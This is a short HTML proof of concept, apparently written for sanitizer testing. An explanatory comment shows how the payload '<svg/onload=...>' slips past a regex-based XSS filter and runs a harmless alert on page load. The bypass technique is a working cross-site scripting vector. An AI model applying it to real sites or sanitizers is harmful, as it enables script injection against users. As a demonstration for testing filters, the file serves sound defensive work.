<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>AMBERORCHID sanitizer-bypass proof of concept</title></head>
<body>
<!--
  Survives sanitizer.sanitize(): no <script>, no whitespace-prefixed on*=,
  no javascript: URL, and <svg> is not on the filter's tag blacklist. The
  onload handler sits directly after the tag-open slash (no whitespace), so the
  `\s+on...=` strip pattern does not match it, while a browser still treats it
  as the SVG load handler and fires it automatically on document load.
-->
<svg/onload="alert('AMBERORCHID')"></svg>
</body>
</html>
